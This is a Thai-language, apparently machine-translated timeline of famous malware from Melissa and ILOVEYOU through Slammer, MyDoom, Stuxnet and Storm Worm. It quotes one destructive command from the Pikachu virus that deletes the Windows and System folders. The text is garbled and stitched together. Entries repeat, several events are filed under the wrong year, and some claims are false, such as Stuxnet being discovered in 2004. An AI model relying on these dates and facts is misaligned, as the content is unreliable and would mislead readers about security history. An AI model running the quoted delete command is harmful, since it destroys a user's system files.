	* 2542: ไวรัสที่ชื่อว่า "Melissa" ได้ติดคอมพิวเตอร์กว่าพันเครื่อง เป็นสาเหตุให้บอดขายของ anti-virus พุ่งขึ้นกว่า $80 ล้านในทันที เจ้าไวรัสตัวนี้ทำงานโดยการทำซ้ำตัวเอง 50 ครั้งโดยใช้ชื่อที่แตกต่างกันไปใน e-mail address book ของคนที่ได้รับ e-mail และมันยังติดไปยัง Microsoft Word documents ปรากฏตัวครั้งแรกในวันที่ 26 มีนาคม 2542 ในสหรัฐอเมริกา รหัสที่เป็นอันตรายนี้ฉลาดใช้สำหรับวิธีการกระจายของวิศวกรรมทางสังคม , มาในตัวอักษรที่มีข้อความต่อไปนี้ "เอกสารที่คุณร้องขอ ... ไม่แสดงให้ทุกคน หลิ่วตา" เขียนโดย เดวิดสมิธ ไวรัสนี้แพร่กระจายผ่านการส่งมวลของข้อความอิเล็กทรอนิกส์เมื่อผู้ใช้เปิดข้อความโหลดแอ็พพลิเคชันและเปิดขึ้นไวรัสจะกำหนดเป้าหมายไฟล์ที่เกี่ยวข้อง Microsoft Word 97/2000 ไวรัสนี้ถูกแจกจ่ายไปยัง 50 รายชื่อแรกจากสมุดที่อยู่อีเมล Melissa เป็น macro virus แรกที่ติดเชื้อประมาณ 20% ของคอมพิวเตอร์ทุกเครื่องทั่วโลก เป็นครั้งแรกในเดือนมีนาคม 2542 โปรแกรมที่เป็นอันตรายถูกส่งไปยังที่อยู่ 50 แห่งแรกของ Outlook Express จดหมายมีไฟล์ LIST.DOC ที่แนบมา (ไวรัส) ซึ่งคาดว่าจะมีรหัสผ่านไปยังไซต์ลามกอนาจาร 80 แห่ง วันที่ 10 ธันวาคม 2542 เขาถูกจำคุก 20 เดือนและถูกปรับจำนวน 5,000 เหรียญสหรัฐ ในขณะที่ความเสียหายที่เกิดจากไวรัสมีมูลค่าประมาณ 80 ล้านเหรียญ ปีเดียวกันไวรัส Tristate เป็นไวรัสมาโครตัวแรกที่ติดเชื้อใน MS-Word97 และ Excel97 และ Powerpoint97 ได้
	20 มกราคม: หนอนแฮปปี้ 99 ปรากฏตัวครั้งแรก มันลูกหูลูกตาแนบตัวเองไปอีเมลแสดงดอกไม้ไฟที่จะซ่อนการเปลี่ยนแปลงที่กำลังทำและมีความประสงค์ที่ผู้ใช้มีความสุขปีใหม่ มันปรับเปลี่ยนไฟล์ระบบที่เกี่ยวข้องกับOutlook ExpressและInternet Explorer (IE) บนWindows 95และWindows 98
	30 ธันวาคม: เวิร์ม Kak เป็นหนอนคอมพิวเตอร์  JavaScript ที่กระจายตัวเองโดยใช้ประโยชน์จากข้อบกพร่องใน Outlook Express
	28 มิถุนายน: ไวรัส Pikachu เชื่อกันว่าเป็นไวรัสคอมพิวเตอร์เครื่องแรกที่มุ่งเน้นไปที่เด็ก ๆ มีตัวละคร "Pikachu" จากชุด Pokemon และอยู่ในรูปแบบอีเมลชื่อ "Pikachu Pokemon" พร้อมข้อความว่า "Pikachu เป็นเพื่อนของคุณ" สิ่งที่แนบไปกับอีเมลนั้นมี "ภาพของ Pikachu ที่หม่นหมอง" พร้อมด้วยข้อความระบุว่า "ระหว่างผู้คนหลายล้านคนทั่วโลกฉันพบคุณอย่าลืมระลึกถึงวันนี้ทุกครั้งที่เพื่อนของฉัน" พร้อมกับภาพมีโปรแกรมเขียนใน Visual Basic 6เรียกว่า "pikachupokemon.exe" ที่ปรับเปลี่ยนแฟ้ม AUTOEXEC.BAT และเพิ่มคำสั่งสำหรับลบเนื้อหาของไดเรกทอรี C: \ Windows และ C: \ Windows \ System เมื่อรีสตาร์ทเครื่องคอมพิวเตอร์อย่างไรก็ตามข้อความจะปรากฏขึ้นในระหว่างการเริ่มต้นถามผู้ใช้ว่าพวกเขาต้องการ ลบเนื้อหาของโฟลเดอร์เหล่านี้เนื่องจากผู้เขียนแทนที่จะเขียนบรรทัด "del C: \ WINDOWS \ *. * / y" และ "del C: \ WINDOWS \ SYSTEM \ *. * / y" ไปที่ AUTOEXEC BAT ผู้เขียนไม่ได้รวมสวิตช์ / y ซึ่งจะเลือกใช่โดยอัตโนมัติระบบปฏิบัติการที่ได้รับผลกระทบจากเวิร์มนี้คือ Windows 95, Windows 98 และ Windows ME
	* 2543: 5 พฤษภาคม ไวรัสคอมพิวเตอร์จาก ฟิ-ลิปินส์ ชื่อ I Love You ส่งตัวเองผ่านสคริป VBScript ภายใน HTML ไปยังเมลล์เซฟเวอร์โดยลิสต์ลายชื่อจากวินโดวส์แอดเดรสบุ๊ค ไวรัสตัวนี้เป็นสาเหตุให้สหรัฐอเมริกาบีบฟิลิปินส์ให้จับกุมตัว Hacker นามแฝงว่า Spider ซึ่งเป็นผู้เขียนไวรัสและลงโทษจำคุกในเวลาต่อมา ไวรัสได้เรียกใช้สคริปต์เพิ่มลงในหนังสือปลอมตัวเป็นไฟล์ข้อความที่มีการประกาศความรักจากเด็กผู้หญิง เขาสามารถรั่วไหลไม่เพียง แต่ไปยังเครื่องพีซีที่บ้านเท่านั้น แต่ยังรวมถึงคนงานและแม้แต่คอมพิวเตอร์ในกระทรวงกลาโหม ความเสียหายหลักของ ILOVEYOU เกิดขึ้นในระหว่างการลบเนื่องจากเครือข่ายหลายแห่งและแม้กระทั่งเซิร์ฟเวอร์อีเมลถูกปิดใช้งานไวรัสชนิดนี้ได้โจมตีคอมพิวเตอร์นับล้านเครื่องที่มีระบบปฏิบัติการ Windows ทำให้เกิดความเสียหายต่อล้านดอลลาร์ ได้รับการพัฒนาโดยโปรแกรมเมอร์จากฟิลิปปินส์ มีการแจกจ่ายโดยอีเมลและมีไฟล์แนบมาเรียกว่า " Love Letter-FOR-YOU.txt.vbs".หลังจากได้รับเอกสารแนบแล้ว VBS นามสกุลไฟล์ไม่ปรากฏขึ้นและจะเข้าใจผิดว่าเป็นไฟล์ข้อความแบบง่ายๆ ฟังก์ชัน สคริปต์ Visual Basic มีวัตถุประสงค์เพื่อส่งข้อความทางอีเมลถึง 50 คนจากรายชื่อผู้ติดต่อทางอีเมล เนื่องจากไวรัสมีลักษณะไม่เป็นอันตรายตั้งแต่แรกเห็นมีผู้คนจำนวนมากได้เปิดเอกสารแนบเพื่อให้โปรแกรมที่เป็นอันตรายสามารถแพร่กระจายได้ง่ายผ่านระบบอีเมลขององค์กรไวรัสนี้ถูกแจกจ่ายด้วยอีเมลและผ่านทางช่อง IRC จดหมายที่มีไวรัสสามารถแยกแยะได้ง่าย หัวเรื่องของจดหมายคือ ILOVEYOU ซึ่งจะจับตาคุณได้ทันที ตัวอักษรตัวนี้มีข้อความกรุณาตรวจสอบ LOVELETTER ที่แนบมาจากฉันและไฟล์แนบ LOVE-LETTER-FOR-YOU.TXT.vbs ไวรัสทำงานเฉพาะเมื่อผู้ใช้เปิดไฟล์ที่แนบมานี้ไวรัสได้ส่งตัวเองไปยังที่อยู่ทั้งหมดที่พบในสมุดที่อยู่ของ MS Outlook ของคอมพิวเตอร์ที่ติดเชื้อและบันทึกสำเนาไฟล์ไว้ในฮาร์ดดิสก์ (irreversibly wiping) ผู้ที่ตกเป็นเหยื่อของไวรัสโดยเฉพาะอย่างยิ่ง, รูปภาพในรูปแบบ JPEG, Java Script และ Visual Basic Script รวมทั้งไฟล์อื่น ๆ และไวรัสได้ซ่อนไฟล์วิดีโอและเพลงไว้ในรูปแบบ MP2 และ MP3 นอกจากนี้ไวรัสได้ดำเนินการหลายอย่างเพื่อติดตั้งตัวเองลงในระบบและติดตั้งโมดูลไวรัสเพิ่มเติมที่ตัวเขาเองสูบออกจากอินเทอร์เน็ตทั้งหมดนี้บ่งชี้ว่าไวรัส VBS.LoveLetter เป็นอันตรายมาก! พร้อมกับการทุจริตข้อมูลโดยตรงและการละเมิดความสมบูรณ์ของการป้องกันระบบปฏิบัติการเขาส่งข้อความจำนวนมาก - สำเนาของเขา ในหลายกรณีไวรัสเป็นอัมพาตการทำงานของสำนักงานทั้งหมด
 วันที่ 24 มกราคมที่: SQL Slammer หนอนอาคาไพลินหนอน , Helkern และอื่น ๆ ที่ชื่อช่องโหว่การโจมตีใน Microsoft SQL Server และ MSDE จะกลายเป็นหนอนที่เร็วที่สุดในการแพร่กระจายของทุกเวลา (วัดโดยการเพิ่มเวลาในอัตราสูงสุดของการเจริญเติบโต) ก่อให้เกิด อินเทอร์เน็ตขัดขวางการเข้าถึงอินเทอร์เน็ตจำนวนมากเพียงสิบห้านาทีหลังจากติดเชื้อเหยื่อรายแรก
	2 เมษายน: Graybird เป็นม้าโทรจันที่รู้จักกันในนาม Backdoor.Graybird
	13 มิถุนายน: ProRat เป็นม้าโทรจันที่สร้างจากตุรกีโดยใช้ Microsoft Windows ซึ่งรู้จักกันในชื่อ RAT (Remote Administrative Tool)
	12 สิงหาคม: หนอน Blaster หรือที่เรียกว่าหนอน Lovesan แพร่กระจายอย่างรวดเร็วโดยใช้ประโยชน์จากช่องโหว่ในบริการระบบที่มีอยู่ในคอมพิวเตอร์ Windows
	18 สิงหาคม: มีการค้นพบหนอนเวลช์ (Nachi) หนอนไวรัสพยายามกำจัดหนอน Blaster และแก้ไข Windows
	19 สิงหาคม: หนอน Sobig (ทางเทคนิคหนอน Sobig.F ) แพร่กระจายอย่างรวดเร็วผ่านระบบ Microsoft ผ่านเครือข่ายอีเมลและเครือข่าย
	18 กันยายน: Swen เป็นหนอนคอมพิวเตอร์ที่เขียนด้วย C++
	24 ตุลาคม: หนอน Sober จะเห็นเป็นครั้งแรกในระบบ Microsoft และยังคงมีอยู่จนถึงปีพ. ศ. 2548 ด้วยตัวแปรใหม่ ๆ การโจมตีจุดอ่อนของเครือข่ายโดย Blaster และ Sobig worm ทำให้เกิดความเสียหายอย่างมาก
	10 พฤศจิกายน: Agobot เป็นหนอนคอมพิวเตอร์ที่สามารถแพร่กระจายตัวเองโดยใช้ประโยชน์จากช่องโหว่ใน Microsoft Windows ช่องโหว่บางตัว ได้แก่ MS03-026 และ MS05-039
	20 พฤศจิกายน: Bolgimo เป็นหนอนคอมพิวเตอร์ที่แพร่กระจายตัวเองโดยใช้ประโยชน์จากช่องโหว่ของหน่วยความจำล้นที่ Microsoft Windows DCOM RPC Interface
	* 2544:
	11 กุมภาพันธ์: ไวรัส Anna Kournikova โจมตีเซิร์ฟเวอร์อีเมลอย่างหนักโดยการส่งอีเมลไปยังผู้ติดต่อในสมุดที่อยู่ของ Microsoft Outlook ผู้สร้าง Jan de Wit ถูกตัดสินให้ทำงานบริการชุมชน 150 ชั่วโมง
	13 มีนาคม: Magistr หรือที่เรียกว่า Disembowler ถูกค้นพบ เป็นเวิร์มอีเมลที่ซับซ้อนสำหรับระบบ Windows ที่มีหลายเพย์โหลดที่แยกเดือนออกจากกัน มันกำหนดเป้าหมายสมาชิกของวิชาชีพกฎหมายโดยค้นหาไฟล์ในคอมพิวเตอร์ของผู้ใช้เพื่อหาคำหลักต่างๆ ที่เกี่ยวข้องกับการพิจารณาคดีของศาล และจะเปิดใช้งานหากพบคำหลักดังกล่าว
	8 พฤษภาคม: เวิร์ม Sadmind แพร่กระจายโดยใช้ประโยชน์จากช่องโหว่ทั้งใน Sun Solaris และ Microsoft IIS
	กรกฎาคม: เวิร์ม Sircam ถูกปล่อยออกมา แพร่กระจายผ่านระบบของ Microsoft ผ่านทางอีเมลและการแชร์เครือข่ายที่ไม่มีการป้องกัน
	13 กรกฎาคม: เวิร์ม Code Red ที่โจมตี Index Server ISAPI Extension ใน Microsoft Internet Information Services ได้รับการเผยแพร่
	4 สิงหาคม: การเขียนหนอน Code Red ใหม่ทั้งหมด Code Red II เริ่มแพร่กระจายอย่างรวดเร็วไปยังระบบของ Microsoft โดยเฉพาะในประเทศจีน
	18 กันยายน: เวิร์ม Nimda ถูกค้นพบและแพร่กระจายด้วยวิธีการต่างๆ รวมถึงช่องโหว่ใน Microsoft Windows และแบ็คดอร์ที่ Code Red II และ Sadmind Worm ทิ้งไว้
	26 ตุลาคม: หนอน Klez ถูกระบุเป็นครั้งแรก มันใช้ประโยชน์จากช่องโหว่ใน Microsoft Internet Explorer และ Microsoft Outlook และ Outlook Express
 	* 2545: The "Klez" worm เป็น bug ที่สามารถส่งตัวเองไปยัง Microsoft Outlook directory ของคนที่ใช้ e-mail ทั่วโลก โดยเริ่มต้นจากการบุกรุกเข้าไปใน Website เป็นอย่างแรก มันจะทำลายและแก้ไขข้อมูล นอกจากนี้มันยังพยายามทำให้โปรแกรม Anti-virus ทำงานไม่ได้อีกด้วย.ไวรัส Bagbear ก็ระบาดเช่นกัน
 	* 2546: 
	24 มกราคม: หนอน SQL Slammer หรือที่รู้จักในชื่อ Sapphire worm, Helkern และชื่ออื่น ๆ โจมตีช่องโหว่ใน Microsoft SQL Server และ MSDE กลายเป็นเวิร์มที่แพร่กระจายเร็วที่สุดตลอดกาล (วัดจากเวลาที่เพิ่มขึ้นเป็นสองเท่าที่อัตราการเติบโตสูงสุด) ก่อให้เกิด การหยุดชะงักของการเข้าถึงอินเทอร์เน็ตครั้งใหญ่ทั่วโลกเพียงสิบห้านาทีหลังจากแพร่เชื้อไปยังเหยื่อรายแรก
	2 เมษายน: Greybird เป็นม้าโทรจันหรือที่เรียกว่า Backdoor.Graybird
	13 มิถุนายน: ProRat เป็นม้าโทรจันแบ็คดอร์ที่ใช้ Microsoft Windows ที่ผลิตในตุรกี หรือที่เรียกกันทั่วไปว่า RAT (Remote Administration Tool)
	มีการค้นพบมัลแวร์ชิ้นแรกๆ ที่ออกแบบมาเพื่อสร้างรายได้ Fizzer เป็นเวิร์มที่แพร่กระจายผ่านทางไฟล์แนบอีเมล ซึ่งเมื่อพบทางเข้าสู่เครื่องแล้ว ก็สามารถทำงานที่เป็นอันตรายได้หลายอย่าง สามารถติดตั้งโปรแกรมล็อกกุญแจ ทำให้แฮ็กเกอร์สามารถเข้าถึงข้อมูลที่ละเอียดอ่อน เช่น รายละเอียดบัญชีธนาคาร รหัสผ่าน และที่อยู่ทางกายภาพ ตราบใดที่เหยื่อพิมพ์ข้อมูลนั้นลงในคอมพิวเตอร์เมื่อใดก็ได้ นอกจากนี้ยังจะปิดกระบวนการป้องกันไวรัสอย่างแข็งขันเพื่อหลีกเลี่ยงการตรวจจับและกำจัด สุดท้าย มันสามารถทำหน้าที่เป็นประตูหลังซึ่งแฮ็กเกอร์สามารถเข้าถึงทรัพยากรของเครื่องที่ติดไวรัสได้จากระยะไกล
	* 2547 :
	24 สิงหาคม The "MyDoom" worm มีการแพร่กระจายอย่างรวดเร็วโดยใช้ e-mail เป็นเครื่องมือ แต่ว่ามันทำให้เกิดความเสียหายเพียงเล็กน้อยเท่านั้น แต่เมื่อประมาณ 1 ปีที่แล้ว MyDoom ใช้ "social engineering" หรือเครื่องมือทางจิตวิทยาที่โน้มน้าวให้คนเปิด e-mail ที่ตนเองได้รับ ซึ่งมันอ้างว่าเป็นการแจ้งว่า e-mail ที่ส่งไปล่าสุดนั้นส่งไม่ได้ MyDoom ซึ่งเป็นไวรัสชนิดแพร่กระจายผ่านทางอินเทอร์เน็ต ไฟล์แนบจะถูกดาวน์โหลดโดยอัตโนมัติหากอีเมลเปิดอยู่และกระจายโดยอัตโนมัติผ่านที่ติดต่อต่างๆในอีเมล นอกจากนี้ยังสามารถถ่ายโอนโปรแกรมจากเครื่องคอมพิวเตอร์ส่วนบุคคลที่มีระบบปฏิบัติการได้อีกด้วย ของ windows Mydoom เป็นหนอนอีเมลที่ติดเครื่องคอมพิวเตอร์ที่ใช้ Microsoft Windows การระบาดยแพร่กระจายอย่างรวดเร็วด้วยอีเมลจดหมายที่มีหัวเรื่อง "Hello", "Test", "Error", "Mail delivery system", "Delivery Notification", "Report server" ซึ่งมีเอกสารแนบ เมื่อเปิดเวิร์มจะส่งตัวเองไปยังที่อยู่อื่นและแก้ไขระบบปฏิบัติการในลักษณะที่ผู้ใช้ไม่สามารถเข้าไปที่ไซต์ของฟีดข่าว บริษัท ป้องกันไวรัสและบางส่วนของเว็บไซต์ Microsoft ได้ ไวรัสดังกล่าวสร้างช่องทางอินเทอร์เน็ตมากขึ้น Mydoom มีข้อความ "Andy, ฉันแค่ทำหน้าที่ของฉันไม่มีอะไรเป็นส่วนตัวขอโทษ" แพร่กระจายไปกว่าพันเครื่องคอมพิวเตอร์ภายในน้อยกว่า 3 ชั่วโมง โดยการสร้างความเสียหายให้กับระบบการทำงานที่เกี่ยวกันด้านธุรกิจ ไวรัส Bagbear.B เวอร์ชั่นต่อมาขโมยข้อมูลสำคัญทางการเงินผู้ติดเชื้อได้ด้วย ยังมี Blaster และ Nachi และ หนอน Bagle: ปรากฏตัวเมื่อวันที่ 18 มกราคม 2547 และกลายเป็นไวรัสที่อุดมสมบูรณ์ที่สุดชนิดหนึ่งที่มีจำนวนพันธุ์ ในขณะนั้นอุตสาหกรรมโปรแกรมป้องกันไวรัสยังไม่ทราบถึงแผนการของเวิร์มซึ่งต้องการสร้างสิ่งที่ใหญ่ที่สุด หนอนตัวนี้ได้เปิดตัวในเดือนมกราคม 2547 ในเวลานั้นมันกลายเป็นหนอนที่เร็วที่สุดที่จะแพร่กระจายผ่านทาง e-mail คอมพิวเตอร์ที่ติดเชื้อในแต่ละครั้งส่งสแปมมากกว่าที่เคยทำมา นอกจากนี้เขาเปลี่ยนระบบปฏิบัติการบล็อกการเข้าถึงไซต์ของ บริษัท ป้องกันไวรัสเว็บไซต์ Microsoft ฟีดข่าว ไวรัสตัวนี้ได้พยายามโจมตี DDoS ในเว็บไซต์ของ Microsoft ในเวลาเดียวกันเครื่องคอมพิวเตอร์ที่ติดเชื้อจำนวนมากได้รับคำขอจากทั่วโลกไปยังเว็บไซต์ Microsoft จำนวนมาก เซิร์ฟเวอร์นำทรัพยากรทั้งหมดไปประมวลผลคำขอเหล่านี้และเกือบจะไม่สามารถเข้าถึงได้สำหรับผู้ใช้ทั่วไป ผู้ใช้คอมพิวเตอร์ที่โจมตีมาอาจไม่ได้สงสัยว่าเครื่องของพวกเขาถูกใช้โดยแฮกเกอร์ ระบาด และสายพันธ์นี้ถูกพัฒนา
	Sasser ไวรัสซึ่งมุ่งเน้นเฉพาะที่เครือข่ายคอมพิวเตอร์ที่ปฏิบัติการภายใต้ระบบปฏิบัติการที่ล้าสมัยเช่น Windows XP และ Windows 2000. แพร่กระจายผ่านทางพอร์ตเครือข่ายที่เสี่ยงต่อการถูกโจมตีจากไวรัสคอมพิวเตอร์และเป็นที่รู้จักเนื่องจากความไม่ปลอดภัยเนื่องจากใช้พอร์ตเครือข่ายเป็นวิธีแพร่กระจายไวรัสซึ่งหมายความว่าสามารถแพร่กระจายได้โดยไม่ต้องมีการแทรกแซงของผู้ใช้เมื่ออุปกรณ์คอมพิวเตอร์มีไวรัส Sasserหน้าต่างป๊อปอัพจะปรากฏขึ้นแสดงว่าระบบจะเริ่มการปิดระบบแบบย้อนกลับไม่ได้หลังจากผ่านไป 1 นาที เรียกหน้าต่างป๊อปอัพ Sasserซึ่งเป็นคำย่อของ บริการระบบย่อย Local Security Authority (LSASS). และ Rugrat เป็นมัลแวร์ที่โจมตีวินโดวส์ 64 Bit ตัวแรก ส่วน Cabir มิถุนายน 2547 เป็นหนอนเครือข่ายตัวแรกที่แพร่กระจายผ่านทางโปรโตคอล Bluetooth และติดตั้งโทรศัพท์มือถือที่ใช้ระบบปฏิบัติการ Symbian OS กับการกำเนิดของหนอนนี้เป็นที่ชัดเจนว่านับจากนี้ไม่เพียง แต่คอมพิวเตอร์ แต่ยังโทรศัพท์สมาร์ทมีการติดเชื้อ วันนี้ภัยคุกคามสำหรับสมาร์ทโฟนมีอยู่แล้วนับล้าน และทั้งหมดเริ่มต้นขึ้นในปีพ. ศ. 2547 เป็นไวรัสมือถือตัวแรกของโลก
	18 มกราคม: Bagleเป็นเวิร์มที่มีการส่งจดหมายจำนวนมากส่งผลกระทบต่อทุกเวอร์ชันของ Microsoft Windows มีหนอน Bagle, Bagle.A และ Bagle.B จำนวน 2 สายพันธุ์ Bagle.B ถูกค้นพบเมื่อวันที่ 17 กุมภาพันธ์ 2547
	ปลายเดือนมกราคม: หนอน MyDoom โผล่ออกมาและปัจจุบันมีสถิติการแพร่กระจายของมัลแวร์จดหมายข่าว หนอนก็น่าทึ่งมากที่สุดสำหรับการดำเนินการกระจายการปฏิเสธการให้บริการ (DDoS) โจมตี www.sco.com ซึ่งเป็นกลุ่ม SCO
	16 กุมภาพันธ์: มีการค้นพบหนอน Netsky เวิร์มกระจายโดยอีเมลและโดยการคัดลอกตัวเองไปยังโฟลเดอร์ต่างๆในฮาร์ดไดรฟ์ภายในเครื่องเช่นเดียวกับไดรฟ์เครือข่ายที่แมปถ้ามี มีหลายตัวแปรของหนอน Netsky ปรากฏขึ้น
	19 มีนาคม: หนอนลึกลับเป็นหนอนทำลายสถิติในหลาย ๆ เรื่อง ใช้ช่องโหว่ในผลิตภัณฑ์ระบบรักษาความปลอดภัยทางอินเทอร์เน็ต (ISS) หลายแห่ง เป็นหนอนอินเทอร์เน็ตตัวแรกที่มีอัตราการทำลายล้างสูงและแพร่กระจายอย่างรวดเร็วโดยใช้รายการโฮสต์ของศูนย์ที่เป็นศูนย์
	1 พฤษภาคม: หนอน Sasserโผล่ออกมาโดยใช้ประโยชน์จากช่องโหว่ในบริการ Microsoft Windows LSASS และทำให้เกิดปัญหาในเครือข่ายในขณะที่ลบรูปแบบ MyDoom และ Bagle ออกไปแม้ว่าจะขัดจังหวะธุรกิจก็ตาม
	15 มิถุนายน: Caribe หรือ Cabir เป็นหนอนคอมพิวเตอร์ที่ถูกออกแบบมาเพื่อการติดเชื้อของโทรศัพท์มือถือที่ใช้ระบบปฏิบัติการ Symbian เป็นหนอนคอมพิวเตอร์เครื่องแรกที่สามารถติดโทรศัพท์มือถือได้ มันแพร่กระจายตัวเองผ่านทางบลูทูธ ข้อมูลเพิ่มเติมสามารถพบได้ใน F-Secure และไซแมนเทค
	16 สิงหาคม: Nuclear RAT (ย่อมาจาก Nuclear Remote Administration Tool) เป็นโทรจันลับๆที่ติดเชื้อระบบครอบครัว Windows NT ( Windows 2000 , Windows XP , Windows 2003 )
  20 สิงหาคม: Vundo หรือ Vundo Trojan (เรียกอีกอย่างหนึ่งว่า Virtumonde หรือ Virtumondo และบางครั้งเรียกว่า MS Juan) เป็นโทรจันที่รู้จักกันดีว่าทำให้เกิดป๊อปอัปและโฆษณาโปรแกรมป้องกันสปายแวร์หลอกลวงและพฤติกรรมอื่น ๆ ที่ประพฤติมิชอบรวมถึงการลดประสิทธิภาพและการปฏิเสธบริการ บางเว็บไซต์รวมทั้ง Google และ Facebook
	12 ตุลาคม: Bifrost หรือที่เรียกว่า Bifrose เป็นโทรจันลับๆที่สามารถติดตั้ง Windows 95 ผ่าน Vista ได้ Bifrost ใช้เซิร์ฟเวอร์ทั่วไปเครื่องสร้างเซิร์ฟเวอร์และการกำหนดค่าโปรแกรมลับๆของไคลเอ็นต์เพื่อให้สามารถโจมตีระยะไกลได้
	ธันวาคม: Santyเป็นที่รู้จักกันเป็นครั้งแรก "หนอนเว็บ" เปิดตัว ใช้ช่องโหว่ใน phpBB และใช้ Googleเพื่อหาเป้าหมายใหม่ มีการติดเชื้อประมาณ 40000 ไซต์ก่อนที่ Google จะกรองข้อความค้นหาที่หนอนใช้เพื่อป้องกันไม่ให้แพร่กระจาย ส่วน Duts.A เป็นไวรัสบน Pocket PC ตัวแรก...
	(เสริม) Stuxnet (อาวุธสงครามทางไซเบอร์) ถูกค้นพบในปี 2547 เป็นความพยายามครั้งแรกของประเทศอธิปไตยที่ใช้มัลแวร์เพื่อโจมตีประเทศอธิปไตยอื่น ๆ Stuxnet ได้รับการออกแบบเพื่อทำลายโรงงานนิวเคลียร์ของอิหร่าน ในความพยายามที่จะชะลอความก้าวหน้าของประเทศในการพัฒนาระเบิดปรมาณู การโจมตีครั้งนี้ประสบความสำเร็จในการชะลอความพยายามของอิหร่าน โดยจัดการทำลายเครื่องหมุนเหวี่ยง 1,000 เครื่องจากทั้งหมด 6,000 เครื่องที่ประเทศใช้เพื่อเสริมสมรรถนะยูเรเนียม แต่ก็ไม่ได้หยุดหรือชะลอการสะสมยูเรเนียมเสริมสมรรถนะต่ำของอิหร่านแม้ว่ารัฐบาลทั้งสองจะปฏิเสธความรับผิดชอบอย่างเป็นทางการต่อการโจมตี แต่ปัจจุบัน Stuxnet เป็นที่รู้จักกันทั่วไปว่าเป็นผลงานของความพยายามร่วมกันระหว่างอิสราเอลและสหรัฐอเมริกา ตามรายงานของทั้ง "The New York Times" และ "The Washington Post" และอื่น ๆ .
 	* 2548 :
	สิงหาคม 2548: Zotob ตุลาคม 2005: การป้องกันการคัดลอก rootkit โดยเจตนาและแอบซ่อนอยู่ในซีดีเพลงที่ขายโดย Sony BMG จะเปิดเผย rootkit สร้างช่องโหว่ในคอมพิวเตอร์ที่ได้รับผลกระทบซึ่งทำให้พวกเขารู้สึกไวต่อการติดเชื้อจากเวิร์มและไวรัส
	ปลายปี 2548: Zlob Trojan เป็นโปรแกรมโทรจันที่ปลอมตัวเป็นตัวแปลงสัญญาณวิดีโอที่จำเป็นในรูปแบบของคอมโพเนนต์ Microsoft Windows ActiveX มันถูกตรวจพบครั้งแรกเมื่อปลายปี 2548
 	* 2549 : 
	20 มกราคม: มีการค้นพบหนอน Nyxem แพร่กระจายโดยการส่งจดหมายจำนวนมาก ซึ่งเปิดใช้งานในวันที่ 3 กุมภาพันธ์ของทุกๆเดือนเริ่มตั้งแต่วันที่ 3 กุมภาพันธ์เป็นต้นไปพยายามปิดใช้งานซอฟต์แวร์ที่เกี่ยวกับความปลอดภัยและแชร์ไฟล์และทำลายไฟล์บางประเภทเช่นไฟล์ Microsoft Office
	16 กุมภาพันธ์: การค้นพบมัลแวร์ตัวแรกสำหรับ Mac OS X มีการประกาศใช้โทรจันที่มีความเสี่ยงต่ำเรียกว่า OSX / Leap -A หรือ OSX / Oompa-A
	ปลายเดือนมีนาคม: พบ Brontok variant N ในปลายเดือนมีนาคม Brontok เป็นหนอนอีเมล์มวลและที่มาของหนอนมาจากอินโดนีเซีย
	มิถุนายน: Starbucks เป็นไวรัสที่ติดเชื้อ StarOffice และ OpenOffice
	ปลายเดือนกันยายน: Stration หรือหนอน Warezov ค้นพบครั้งแรก
	* 2549 : 20 มกราคม: หนอน Nyxem ถูกค้นพบ มันแพร่กระจายโดยการส่งไปรษณีย์จำนวนมาก เพย์โหลดซึ่งเปิดใช้งานในวันที่สามของทุกเดือน เริ่มตั้งแต่วันที่ 3 กุมภาพันธ์ พยายามปิดใช้งานซอฟต์แวร์ที่เกี่ยวข้องกับความปลอดภัยและการแชร์ไฟล์ และทำลายไฟล์บางประเภท เช่น ไฟล์ Microsoft Office
	17 มกราคม: Storm Worm ระบุว่าเป็นภัยคุกคามสแปมอีเมลที่แพร่กระจายอย่างรวดเร็วต่อระบบของ Microsoft มันเริ่มรวบรวมคอมพิวเตอร์ที่ติดไวรัสเข้าสู่ Storm botnet เมื่อประมาณวันที่ 30 มิถุนายน ไวรัสได้ติดไวรัสในคอมพิวเตอร์ 1.7 ล้านเครื่อง และมีการบุกรุกระหว่างคอมพิวเตอร์ 1 ถึง 10 ล้านเครื่องในเดือนกันยายน คิดว่ามีต้นตอมาจากรัสเซีย โดยปลอมตัวเป็นอีเมลข่าวที่มีภาพยนตร์เกี่ยวกับข่าวลวงขอให้คุณดาวน์โหลดไฟล์แนบที่อ้างว่าเป็นภาพยนตร์
	กรกฎาคม: Zeus เป็นโทรจันที่กำหนดเป้าหมาย Microsoft Windows เพื่อขโมยข้อมูลการธนาคารโดยการกดแป้นบันทึก
	* 2550 : Storm Worm - แบ็คดอร์ชนิด Trojan horse ที่ติดไวรัสระบบปฏิบัติการ Microsoft Windows มันถูกค้นพบครั้งแรกเมื่อวันที่ 17 มกราคม 2550 ซึ่งมีชื่อว่า "230 คนถูกสังหารจากพายุในทวีปยุโรป" (230 คนตายเป็นแป้งEurope) และต่อมามีหัวเรื่องอื่น ๆ ไฟล์แนบกับจดหมายประกอบด้วยไวรัสที่ทำให้เกิด "ข้อบกพร่อง" ในระบบข้อมูลคอมพิวเตอร์ที่ใช้ในการรับข้อมูลหรือส่งสแปม ตามการคำนวณประมาณ 10 ล้านเครื่องคอมพิวเตอร์มีการติดเชื้อมัลแวร์ Storm Worm มีการแจกจ่ายผ่านอีเมลซึ่งประกอบด้วยข้อมูลโดยละเอียดเกี่ยวกับข่าวต่างๆซึ่งไม่ต้องสงสัยดึงดูดความสนใจของผู้รับใด ๆ ถือว่าเป็นหนึ่งในอันตรายมากที่สุดเนื่องจากสามารถจัดส่งได้ถึง 14 หัวข้ออีเมลที่แตกต่างกันและไฟล์ปฏิบัติการที่ไม่ซ้ำกัน 18 ไฟล์แนบโดยอัตโนมัติกับตัวอักษร เมื่อสิ่งที่แนบมาถูกเปิดโดยผู้รับแฟ้มระบบจะเสียหายและเอกสารสำคัญที่เก็บไว้ในคอมพิวเตอร์จะเริ่มได้รับความเสียหายอย่างต่อเนื่อง ไวรัสยังสามารถแพร่กระจายผ่าน botnet และ rootkit ได้ ตั้งแต่ Storm Worm มีอยู่จนถึงทุกวันนี้ถือว่าเป็นไวรัสคอมพิวเตอร์ที่อันตรายที่สุดตลอดกาลเวลาของ
